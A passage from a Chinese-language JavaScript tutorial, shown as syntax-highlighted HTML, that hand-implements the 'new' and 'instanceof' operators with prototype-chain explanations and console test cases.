<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old.`</span>);
};

<span class="hljs-keyword">const</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>);
<span class="hljs-keyword">const</span> person2 = <span class="hljs-title function_">myNew</span>(<span class="hljs-title class_">Person</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-number">30</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person2.<span class="hljs-property">name</span>); <span class="hljs-comment">// Bob</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person2.<span class="hljs-property">age</span>); <span class="hljs-comment">// 30</span>
person2.<span class="hljs-title function_">introduce</span>(); <span class="hljs-comment">// Hi, I'm Bob, 30 years old.</span>

</code></pre>
<h5 data-id="heading-6">2.2 完整实现(处理边界情况)</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 完整版 myNew 实现，处理各种边界情况
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} Constructor 构造函数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">...any</span>} args 构造函数参数
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Object</span>} 新创建的对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-params">Constructor, ...args</span>) {
  <span class="hljs-comment">// 参数验证</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Constructor must be a function."</span>);
  }

  <span class="hljs-comment">// 1. 创建一个新对象, 继承构造函数的原型</span>
  <span class="hljs-comment">// 使用 Object.create 而不是 {}, 确保原型链正确</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 2. 执行构造函数, 绑定 this 到新对象</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);

  <span class="hljs-comment">// 3. 处理返回值</span>
  <span class="hljs-comment">// 3.1 如果构造函数返回一个对象，则返回该对象</span>
  <span class="hljs-comment">// 3.2 否则返回新创建的对象</span>
  <span class="hljs-keyword">const</span> isObject = result !== <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">"object"</span>;
  <span class="hljs-keyword">const</span> isFunction = <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">"function"</span>;

  <span class="hljs-keyword">return</span> isObject || isFunction ? result : obj;
}
<span class="hljs-comment">// 测试各种边界情况</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 测试 myNewComplete ==="</span>);

<span class="hljs-comment">// 测试1: 构造函数返回对象</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonWithReturnObject</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">custom</span>: <span class="hljs-string">"custom object"</span> };
}

<span class="hljs-keyword">const</span> test1 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">PersonWithReturnObject</span>, <span class="hljs-string">"Alice"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试1 - 构造函数返回对象:"</span>, test1); <span class="hljs-comment">// { custom: 'custom object' }</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"测试1 - 不是 Person 实例:"</span>,
  !(test1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PersonWithReturnObject</span>)
); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试2: 构造函数返回 null</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonWithReturnNull</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">const</span> test2 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">PersonWithReturnNull</span>, <span class="hljs-string">"Bob"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"测试2 - 构造函数返回 null:"</span>,
  test2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PersonWithReturnNull</span>
); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试2 - name 属性:"</span>, test2.<span class="hljs-property">name</span>); <span class="hljs-comment">// Bob</span>

<span class="hljs-comment">// 测试3: 构造函数返回函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonWithReturnFunction</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"I am a function"</span>;
  };
}

<span class="hljs-keyword">const</span> test3 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">PersonWithReturnFunction</span>, <span class="hljs-string">"Charlie"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试3 - 构造函数返回函数:"</span>, <span class="hljs-keyword">typeof</span> test3); <span class="hljs-comment">// function</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试3 - 函数调用:"</span>, <span class="hljs-title function_">test3</span>()); <span class="hljs-comment">// I am a function</span>

<span class="hljs-comment">// 测试4: 构造函数返回基本类型</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonWithReturnPrimitive</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-keyword">return</span> <span class="hljs-number">42</span>;
}

<span class="hljs-keyword">const</span> test4 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">PersonWithReturnPrimitive</span>, <span class="hljs-string">"David"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(
  <span class="hljs-string">"测试4 - 构造函数返回基本类型:"</span>,
  test4 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PersonWithReturnPrimitive</span>
); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试4 - name 属性:"</span>, test4.<span class="hljs-property">name</span>); <span class="hljs-comment">// David</span>

<span class="hljs-comment">// 测试5: 构造函数没有返回值</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">PersonNoReturn</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> test5 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">PersonNoReturn</span>, <span class="hljs-string">"Eve"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试5 - 构造函数没有返回值:"</span>, test5 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">PersonNoReturn</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"测试5 - name 属性:"</span>, test5.<span class="hljs-property">name</span>); <span class="hljs-comment">// Eve</span>
</code></pre>
<h5 data-id="heading-7">2.3 处理ES6类的版本</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 完整版 myNew 实现，处理各种边界情况（包括 ES6 类）
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} Constructor 构造函数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">...any</span>} args 构造函数参数
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Object</span>} 新创建的对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-params">Constructor, ...args</span>) {
  <span class="hljs-comment">// 参数验证</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> !== <span class="hljs-string">"function"</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">"Constructor must be a function."</span>);
  }

  <span class="hljs-comment">// 是哟哦那个 Reflect.construct 处理 ES6 类和普通函数</span>
  <span class="hljs-keyword">const</span> instance = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(<span class="hljs-title class_">Constructor</span>, args, <span class="hljs-title class_">Constructor</span>);

  <span class="hljs-comment">// 对于普通函数, 处理返回值逻辑</span>
  <span class="hljs-comment">// 判断是否是 ES6类(简单判断方式)</span>
  <span class="hljs-keyword">const</span> isClass =
    <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> === <span class="hljs-string">"function"</span> &amp;&amp;
    (<span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"class"</span>) ||
      <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(<span class="hljs-title class_">Constructor</span>).<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"class"</span>));

  <span class="hljs-keyword">if</span> (!isClass) {
    <span class="hljs-comment">// 检查构造函数是否显式返回了对象/函数</span>
    <span class="hljs-keyword">const</span> isObject = instance !== <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">typeof</span> instance === <span class="hljs-string">"object"</span>;
    <span class="hljs-keyword">const</span> isFunction = <span class="hljs-keyword">typeof</span> instance === <span class="hljs-string">"function"</span>;

    <span class="hljs-comment">// 如果构造函数返回的不是继承自其原型的对象, 说明显式返回了其他值</span>
    <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Constructor</span>)) {
      <span class="hljs-keyword">return</span> isObject || isFunction
        ? instance
        : <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
    }
  }

  <span class="hljs-keyword">return</span> instance;
}
</code></pre>
<h4 data-id="heading-8">2.4 测试用例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 完整测试用例 ==="</span>);

<span class="hljs-comment">// 测试类继承</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> makes a noise.`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, breed</span>) {
    <span class="hljs-variable language_">super</span>(name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.breed}</span>) barks.`</span>);
  }
}

<span class="hljs-comment">// 测试 ES6 类</span>
<span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">"Rex"</span>, <span class="hljs-string">"Labrador"</span>);
<span class="hljs-keyword">const</span> dog2 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">Dog</span>, <span class="hljs-string">"Buddy"</span>, <span class="hljs-string">"Golden Retriever"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog1 instanceof Dog:"</span>, dog1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog2 instanceof Dog:"</span>, dog2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog1 instanceof Animal:"</span>, dog1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog2 instanceof Animal:"</span>, dog2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>

dog1.<span class="hljs-title function_">speak</span>(); <span class="hljs-comment">// Rex (Labrador) barks.</span>
dog2.<span class="hljs-title function_">speak</span>(); <span class="hljs-comment">// Buddy (Golden Retriever) barks.</span>

<span class="hljs-comment">// 测试内置构造函数</span>
<span class="hljs-keyword">const</span> date1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">"2025-12-08"</span>);
<span class="hljs-keyword">const</span> date2 = <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-title class_">Date</span>, <span class="hljs-string">"2025-12-08"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"date1 instanceof Date:"</span>, date1 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"date2 instanceof Date:"</span>, date2 <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"date1.toISOString():"</span>, date1.<span class="hljs-title function_">toISOString</span>()); <span class="hljs-comment">// 2025-12-08T00:00:00.000Z</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"date2.toISOString():"</span>, date2.<span class="hljs-title function_">toISOString</span>()); <span class="hljs-comment">// 2025-12-08T00:00:00.000Z</span>

<span class="hljs-comment">// 测试错误情况</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-literal">null</span>);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"错误测试1 - null:"</span>, error.<span class="hljs-property">message</span>); <span class="hljs-comment">// Constructor must be a function</span>
}

<span class="hljs-keyword">try</span> {
  <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-number">42</span>);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"错误测试2 - 数字:"</span>, error.<span class="hljs-property">message</span>); <span class="hljs-comment">// Constructor must be a function</span>
}

<span class="hljs-keyword">try</span> {
  <span class="hljs-title function_">myNewComplete</span>(<span class="hljs-string">"string"</span>);
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"错误测试3 - 字符串:"</span>, error.<span class="hljs-property">message</span>); <span class="hljs-comment">// Constructor must be a function</span>
}
</code></pre>
<h4 data-id="heading-9">三、instanceof的深入理解</h4>
<h5 data-id="heading-10">3.1 instanceof操作符的作用</h5>
<p><code>instanceof</code>操作符用于检测构造函数的<code>prototype</code>属性是否出现在某个实例对象的原型链上。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}

<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// false</span>
</code></pre>
<h5 data-id="heading-11">3.2 instanceof的工作原理</h5>
<p><code>instanceof</code>操作符的算法可以描述为:</p>
<ol>
<li>获取右侧操作数的<code>prototype</code>属性</li>
<li>获取左侧操作数的<code>[[Prototype]]</code>链(即<code>__proto__</code>链)</li>
<li>沿着原型链向上查找, 如果找到与右侧<code>prototype</code>相同的对象, 返回<code>true</code></li>
<li>如果到达原型链末端(<code>null</code>)仍未找到, 返回<code>false</code></li>
</ol>
<h4 data-id="heading-12">四、手写 instanceof 操作符</h4>
<h5 data-id="heading-13">4.1 基础实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 手写 instanceof 操作符
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} instance 需要检测的对象
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} Constructor 构造函数
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>} 检测结果
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myInstanceof</span>(<span class="hljs-params">instance, Constructor</span>) {
  <span class="hljs-comment">// 基本类型直接返回false</span>
  <span class="hljs-keyword">if</span> (
    instance === <span class="hljs-literal">null</span> ||
    (<span class="hljs-keyword">typeof</span> instance !== <span class="hljs-string">"object"</span> &amp;&amp; <span class="hljs-keyword">typeof</span> instance !== <span class="hljs-string">"function"</span>)
  ) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }

  <span class="hljs-comment">// 获取构造函数的 prototype</span>
  <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;

  <span class="hljs-comment">// 获取实例的原型</span>
  <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(instance);

  <span class="hljs-comment">// 沿着原型链向上查找</span>
  <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">if</span> (proto === prototype) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-comment">// 测试基础功能</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params"/>) {}

<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();
<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 测试 myInstanceof ==="</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog instanceof Dog:"</span>, <span class="hljs-title function_">myInstanceof</span>(dog, <span class="hljs-title class_">Dog</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog instanceof Animal:"</span>, <span class="hljs-title function_">myInstanceof</span>(dog, <span class="hljs-title class_">Animal</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog instanceof Object:"</span>, <span class="hljs-title function_">myInstanceof</span>(dog, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"dog instanceof Cat:"</span>, <span class="hljs-title function_">myInstanceof</span>(dog, <span class="hljs-title class_">Cat</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat instanceof Dog:"</span>, <span class="hljs-title function_">myInstanceof</span>(cat, <span class="hljs-title class_">Dog</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<h5 data-id="heading-14">4.2 完整实现(处理边界情况)</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 完整版 myInstanceof 实现
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} instance 要检测的对象
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} Constructor 构造函数
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>} 检测结果
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myInstanceofComplete</span>(<span class="hljs-params">instance, Constructor</span>) {
    <span class="hljs-comment">// 参数验证</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Constructor</span> !== <span class="hljs-string">'function'</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Right-hand side of instanceof is not callable'</span>);
    }
    
    <span class="hljs-comment">// 基本类型直接返回 false</span>
    <span class="hljs-comment">// 注意：null 和 undefined 返回 false</span>
    <span class="hljs-keyword">if</span> (instance === <span class="hljs-literal">null</span> || instance === <span class="hljs-literal">undefined</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-comment">// 对于非对象类型，除了 function 外都返回 false</span>
    <span class="hljs-keyword">const</span> type = <span class="hljs-keyword">typeof</span> instance;
    <span class="hljs-keyword">if</span> (type !== <span class="hljs-string">'object'</span> &amp;&amp; type !== <span class="hljs-string">'function'</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-comment">// 获取构造函数的 prototype</span>
    <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
    
    <span class="hljs-comment">// 如果构造函数的 prototype 不是对象，抛出错误</span>
    <span class="hljs-keyword">if</span> (prototype === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> prototype !== <span class="hljs-string">'object'</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function has non-object prototype in instanceof check'</span>);
    }
    
    <span class="hljs-comment">// 获取实例的原型</span>
    <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(instance);
    
    <span class="hljs-comment">// 沿着原型链向上查找</span>
    <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (proto === prototype) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}

<span class="hljs-comment">// 测试完整功能</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 测试 myInstanceofComplete ==='</span>);

<span class="hljs-comment">// 测试1: 基本类型</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - 数字:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(<span class="hljs-number">42</span>, <span class="hljs-title class_">Number</span>));         <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - 字符串:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(<span class="hljs-string">'hello'</span>, <span class="hljs-title class_">String</span>));  <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - 布尔值:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(<span class="hljs-literal">true</span>, <span class="hljs-title class_">Boolean</span>));    <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - null:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(<span class="hljs-literal">null</span>, <span class="hljs-title class_">Object</span>));       <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试1 - undefined:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(<span class="hljs-literal">undefined</span>, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 测试2: 对象类型</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试2 - 对象:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(person, <span class="hljs-title class_">Person</span>));     <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试2 - 对象 instanceof Object:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(person, <span class="hljs-title class_">Object</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 测试3: 数组</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'测试3 - 数组:'</span>, <span class="hljs-title function_">myInstanceofComplete</span>(arr, <span class="hljs-title class_">Array</span>));         <span class="hljs-comment">// true</span>
